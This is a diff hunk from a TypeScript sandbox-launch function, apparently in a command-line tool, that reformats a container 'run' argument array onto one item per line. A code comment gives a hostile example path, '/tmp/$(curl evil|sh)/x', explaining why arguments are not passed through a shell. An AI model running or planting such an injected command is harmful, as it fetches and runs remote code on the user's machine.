@@ -624,13 +624,20 @@ export async function start_sandbox(
       // a repo cloned into /tmp/$(curl evil|sh)/x would execute the
       // backticked content the first time the sandbox proxy starts.
       const proxyArgs: string[] = [
-        'run', '--rm', '--init',
+        'run',
+        '--rm',
+        '--init',
         ...(userFlag ? userFlag.split(/\s+/).filter(Boolean) : []),
-        '--name', SANDBOX_PROXY_NAME,
-        '--network', SANDBOX_PROXY_NAME,
-        '-p', '8877:8877',
-        '-v', `${process.cwd()}:${workdir}`,
-        '--workdir', workdir,
+        '--name',
+        SANDBOX_PROXY_NAME,
+        '--network',
+        SANDBOX_PROXY_NAME,
+        '-p',
+        '8877:8877',
+        '-v',
+        `${process.cwd()}:${workdir}`,
+        '--workdir',
+        workdir,
         image,
         // proxyCommand comes from GEMINI_SANDBOX_PROXY_COMMAND. It is a
         // single shell string the user configured; split on whitespace
